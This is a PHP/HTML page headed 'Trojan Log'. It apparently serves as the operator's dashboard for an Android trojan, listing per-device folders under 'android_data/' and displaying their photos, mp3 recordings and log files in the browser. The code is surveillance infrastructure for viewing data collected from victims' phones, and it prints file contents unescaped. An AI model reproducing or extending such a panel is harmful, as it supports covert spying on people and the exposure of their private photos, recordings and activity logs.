<!DOCTYPE html>
<html lang="en">
	<head>
	    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
	    <title>Trojan File Access</title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.js" type="text/javascript"></script>
		<link rel='stylesheet' type='text/css' href='//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css'>
		<link href="https://fonts.googleapis.com/css?family=Signika|Nunito:600|Raleway:500" rel="stylesheet">

		<style type="text/css">
			body {
				/*color: #444;*/
				font-family: 'Lato', sans-serif;
				height: 100%;
			}
			ul {
				padding-left: 0;
			}
			li {
				list-style: none;
			}

			/*CSS of li style Menu*/
			li.menu {
				border-top: solid 1px #3C3735;
				border-bottom: solid 1px #3C3735;
				text-decoration: none;
				padding-left: 0px;
				left:0;
			}
			li.menu a{
				font-size: 22px;
				font-family: 'Signika', sans-serif;
				color: white;
				padding: 5px 0px 5px 0px;
				text-transform: lowercase;
				text-align: left;
				padding-left: 20px;
			}

			a:hover{
				text-decoration: none;
			}
			/*End of li style Menu*/
			/*CSS img style*/
			img {
				/*padding: 5px;*/
				/*margin-left: 15px;*/
				/*width: 10%;*/

				border: none;
				max-width: 100%;
				height: auto;
				display: block;
				background: #ccc;
				transition: transform .2s ease-in-out;

			}

			div .im{
				width: 85%;
				height: 100%;
				/*font-size: 0;*/
			}

			a.img {
				font-size: 16px;
				overflow: hidden;
				display: inline-block;
				margin-bottom: 8px;
				width: calc(15% - 6px);
				/*height: calc(15% - 6px);*/
				margin-right: 8px;
			}

			a:nth-of-type(2n) {
				margin-right: 0;
			}

			@media screen and (min-width: 50em) {
				a.img{
					max-width: calc(15% - 6px);
					/*max-height: calc(15% - 6px);*/
				}
				a:nth-of-type(2n) {
					margin-right: 8px;
				}
				a:nth-of-type(6n) {
					margin-right: 0;
				}
			}

			a:hover img {
				transform: scale(1.15);
			}

			figure {
				margin: 0;
				height: auto;
			}
			/*End of img style*/
			/*CSS Logo/Header*/
			.logo {
				text-transform: lowercase;
				font: 300 2em "Source Sans Pro", Helvetica, Arial, sans-serif;
				text-align: center;
				padding: 0;
				margin: 0;
			}
			.logo a {
				display: block;
				padding: 1em 0;
				color: #DFDBD9;
				text-decoration: none;
				transition: .15s linear color;
			}
			.logo a:hover {
				color: #fff;
			}
			.logo a:hover span {
				color: #DF4500;
			}
			.logo span {
				font-weight: 700;
				transition: .15s linear color;
			}
			/*End of Logo/Header*/
			/*CSS Expand Content*/
			.expand{
				display: none;
				max-height: 100%;
				/*overflow-y:hidden;*/

			}

			.expand:target{
				display: block;
				font-size: larger;
				margin-bottom: 20%;
				padding-top: 25px;
				padding-left: 20px;
				max-height: 100%;
				overflow-y: auto;
			}

			::-webkit-scrollbar {
			    -webkit-appearance: none;
			    width: 7px;
			}

			::-webkit-scrollbar-thumb {
			    border-radius: 4px;
			    background-color: rgba(0,0,0,.5);
			    -webkit-box-shadow: 0 0 1px rgba(255,255,255,.5);
			}
			/*End of Expand Content*/
			/*CSS Sidebar Menu position*/
			.menu_id{
				position: absolute;
				width: 13%;
				padding-left: 0;
				background-color: #35302D;
				/*padding-bottom: 1%;*/
				height: 100%;
				overflow: hidden;
			}
			/*End of sidebar menu position*/
			/*CSS of Content*/
			.content{
				float: right;
				padding-left: 1%;
				position: fixed;
				top:0px;
				right: 0px;
				left: 13%;
				width: 85%;
				height: 100%;
				padding-bottom: 1%;
				/*overflow-y:hidden;*/
			}
			/*End of Content*/

			/*CSS Menu Sidebar Style*/
			*, :before, :after{
				box-sizing: border-box;
			}

			.unstyled {
			  list-style: none;
			  padding: 0;
			  margin: 0;
			}
			.unstyled a {
			  text-decoration: none;
			}

			// HOVER SLIDE EFFECT
			.list-hover-slide li{
				position: relative;
				overflow: hidden;
			}
			.list-hover-slide a{
			    display: block;
			    position: relative;
			    z-index: 1;
			    transition: .35s ease color;
			}
			.list-hover-slide a:before{
			    content: '';
			    display: block;
			    z-index: -1;
			    position: absolute;
			    left: -100%; top: 0;
			    width: 100%; height: 100%;
			    /*border-left: solid 5px #DF4500;*/
			    border-right: solid 5px #DF4500;
			    background: #3C3735;
			    transition: .35s ease left;
			}

			.list-hover-slide a.is-current:before, .list-hover-slide a:hover:before{
				left: 0;
		    }
		    /*End of Sidebar Menu Style*/

		    .log{
		    	font-size: 20px;
		    	padding-top: 30px;
		    	padding-bottom: 10px;
		    	font-family: 'Raleway', sans-serif;
		    	font-weight: bold;
		    	color: #0091ff;
		    }

		    hr {
	    		border: 0;
			    height: 1px;
			    background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0));
		    }

		    .text {
			  padding-top: 5px;
			  padding-bottom: 5px;
			  padding-left: 15px;
			  border: solid 4px grey;
			  border-radius: 10px;
			  overflow-y: scroll;
			  height: 30%;
			  width: 70%;
			  white-space: pre-line;
			  font-family: 'Nunito', sans-serif;
			}

			textarea{
				border-radius: 10px;
				padding-left: 15px;
			}
			summary{
				/*color:#993333;*/
				color: #0074cc;
				font-family: 'Raleway', sans-serif;
				font-weight: bold;
			}

			summary::-webkit-details-marker{
		    color: #33ccff;
		  }

			summary.im2{
				width: 85%;
				height: 100%;
				text-indent: 2em;
			}

		  summary:focus{
		    outline-style: none;
				width: 85%;
				height: 100%;
		  }

			form.form_style{
				padding-left: 3em;
				padding-top: 10px;
			}
		</style>

		<script>

		</script>

	</head>
	<body>
		<?php
			$dir = "android_data/";
			$finfo = finfo_open(FILEINFO_MIME_TYPE);
			if($dir === FALSE){
				echo "could not read the file.";
			} else {
				echo "<div class=\"menu_id\">";
				echo "<h1 class=\"logo\">";
				echo "<a href=\"#\">";
				echo "Trojan <span>Log</span>";
				echo "</a>";
				echo "</h1>";

				 	foreach (glob($dir . "*/") as $file){

						$filename = basename($file);

						if(is_dir($file)) {
							echo "<li class=\"menu list-hover-slide\"><a href=\"#$filename\">$filename</a></li>";
							$open = scandir($file);
								// echo "<div class=\"content\">";
									echo "<ul class=\"content expand\" id=\"$filename\">";
										echo "<div class=\"im\">";


											foreach($open as $files){
												if($files == '.' || $files == '..'){
													continue;
												}
												// if(is_file("$dir/$value")) {$result[]="$dir/$value";continue;}
												// echo finfo_file($finfo, $files);
												// echo "<li><a href=\"$file/$files\"</a>$files</li>" ;

												$imgExts = array("gif", "jpg", "jpeg", "png", "tiff", "tif");
												$url = $files;
												// echo $files;

												$urlExt = pathinfo($url, PATHINFO_EXTENSION);

												if (in_array($urlExt, $imgExts)) {
												    echo "<a href=\"$file/$url\" class=\"img\">";
												    	echo "<figure>";
													    	echo "<img src=\"$file/$url\">";
												    	echo "</figure>";
												    echo "</a>";
												    // echo "<li><a href=\"$file/$files\"</a>$files</li>" ;
													// echo "<li><a href=\"#\"</a>$files</li>";
												// }elseif(is_dir($files)){


												}else{

													foreach(glob($file . "$files/") as $subdirectory){
														if($files == '.' || $files == '..'){
															continue;
														}

														$namedir = basename($subdirectory);
														// echo "<li>$namedir</li>";


														if(is_dir($subdirectory)){

															echo "<details>";
																echo "<summary  class=\"im\">$namedir</summary>";
																$scansubdir = scandir($subdirectory);
																// echo $scansubdir;
																// echo $subdirectory;
																foreach ($scansubdir as $directory) {


																	if($directory == '.' || $directory == '..'){
																		continue;
																	}


																	$imgExts = array("gif", "jpg", "jpeg", "png", "tiff", "tif");
																	$othersExts = array("mp3");
																	$url = $directory;
																	// echo $url;
																	// echo $subdirectory;

																	$urlExt = pathinfo($url, PATHINFO_EXTENSION);

																	if (in_array($urlExt, $imgExts)) {

																	    echo "<a href=\"$subdirectory$url\" class=\"img\">";
																	    	echo "<figure>";
																		    	echo "<img src=\"$subdirectory$url\">";
																	    	echo "</figure>";
																	    echo "</a>";

																	}elseif (in_array($urlExt, $othersExts)){
																		echo "<li><a href=\"$subdirectory$directory\">$directory</a></li>";
																	}else{
																	$logging = '*.log';

																		foreach(glob($subdirectory.$directory) as $logku){
																			$based = basename($logku);

																			// echo "$based<br>";
																			// echo basename($subdirectory);
																			echo "<details>";
																				echo "<summary  class=\"im2\">$based</summary>";
																			// echo "<li class=\"log\">$based</li>";

																			$logfile = file($logku);
																			$contentlog = implode($logfile);
																			// echo "<div class=\"text\">";

																					echo "<form class=\"form_style\">";
																						echo "<textarea rows=\"10\" cols=\"85\">$contentlog</textarea>";
																					echo "</form>";
																			echo "<hr>";
																			echo "</details>";

																		}
																	}
																}

															}
															echo "</details>";

													}

												}

											}
										echo "</div>";

									echo "</ul>";

						}


					}
					echo "</ul>";
				echo "</div>";
			}
		?>
	</body>
</html>
